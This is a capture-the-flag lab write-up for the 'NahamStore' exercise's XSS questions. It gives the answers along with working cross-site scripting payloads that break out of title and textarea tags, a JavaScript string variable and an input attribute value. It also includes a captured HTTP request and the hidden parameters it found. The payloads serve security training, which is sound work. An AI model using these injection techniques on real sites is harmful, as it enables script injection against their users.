#XSS

1. Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS

http://marketing.nahamstore.thm/?error=hello

hello is reflect back on the page. so am trying to execute java-script function
<script>alert("hacked by nazu")</script>

http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(%22hacked%20by%20nazu%22)%3C/script%3E | BOOM!

URL ( including parameters ) of an endpoint that is vulnerable to XSS

answer = http://marketing.nahamstore.thm/?error=

2.What HTTP header can be used to create a Stored XXS

answer = user-agent 
cuz it was stord on the page when you orderd something from the page.

3.What HTML tag needs to be escaped on the product page to get the XSS to work?

if you can see the name "Sticker Pack" is reflected on two place. the first one is on the header place and the second one is on the body place inside div tag. so what we need to execute xss on the name parameter?

first we need to balance our payload. for this we should close the title tag then we inject our payload finally we create open title tag.

our payload = </title><script>alert("hacked by nazu")</script><title>

answer = title

4.What JavaScript variable needs to be escaped to get the XSS to work?

=> on the main page(nahamstore.thm) we will see search engine. when we search something on it, our input being reflected on the page. so we know how we balance something for executing xss.

in the source code i found #search parameter. so the question is JavaScript variable not html tag. 

our payload = ';alert("hacked by nazu");'

var search = '';alert("hacked by nazu");'';

answer  => search

5.What #hidden parameter can be found on the #shop home page that introduces an XSS vulnerability.

hidden means we only see on source code or brutforcing and so on..

So on the line 53 i saw this code
$.get('/search-products?q=' + search,function(resp){
if you can see always parameter satands from "?" sign and it have key and value "?q=" for example = ?name=nazu

answer is ='q'

6.What HTML tag needs to be escaped on the returns page to get the XSS to work?

first go to return page then order something 

if you can see your text area input reflected back on the page. so for this issue first we close the text-are tag then we inject our code finally we open text area tag for that closed tag.

payload = </textarea><script>alert("hacked by nazu")</script><textarea>

source code = <textarea class="form-control"></textarea><script>alert("hacked by nazu")</script><textarea></textarea>

answer = textarea

7.What is the value of the H1 tag of the page that uses the requested URL to create an XSS

when am trying to enumerate hidden URL and directory i found 404 page but our directory is reflected back on the page inside P tag.

http://nahamstore.thm/.htacces

```<h1 class="text-center">Page Not Found</h1>
<p class="text-center">Sorry, we couldn't find /.htacces anywhere</p>```

http://nahamstore.thm/<script>alert("hacked by nazu")</script>

<p class="text-center">Sorry, we couldn't find /<script>alert("hacked by nazu")</script> anywhere</p>

answer = Page Not Found
 
8.What other hidden parameter can be found on the shop which can introduce an XSS vulnerability

to be honest i spend 1+ hour for this question. don't try manually. use burp suite instead of it.

first click on the products from "sticker pack" and "hoodie", then type discount coupon code and hit "add to basket" button, remember use burp to capture this request

Request

```POST /product?id=2 HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://nahamstore.thm
Connection: close
Referer: http://nahamstore.thm/product?id=2
Cookie: session=9604154dd85ab285184436dd6ebc37cd
Upgrade-Insecure-Requests: 1

add_to_basket=1&discount=12```

notice on the http request start line and body

id=2
add_to_basket=1
discount=12


then i'm trying to execute xss using those parameter. but not interesting. so i changed the request method.

GET /product?id=2&add_to_basket=1&discount=12 HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nahamstore.thm
Connection: close
Referer: http://nahamstore.thm/product?id=2
Cookie: session=9604154dd85ab285184436dd6ebc37cd
Upgrade-Insecure-Requests: 1

and it also refleted back on the page 

                      ``` <form method="post">
                            <input type="hidden" name="add_to_basket" value="1">
                            <div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value="12"></div>
                            <input type="submit" class="btn btn-success" value="Add To basket">
                            <input type="button" class="btn btn-info checkstock" data-product-id="1" value="Check Stock">
                        </form>```

notice on the "name="discount" value="12">"

if i inject like this => "<script>alert("hacked by nazu")";// inside discount parameter guess what will happened?

first it will close the value parameter using double quote(") then the code will execute.

look 

value="12"
value=""<script>alert("hacked by nazu")";" | boom! 

answer = discount
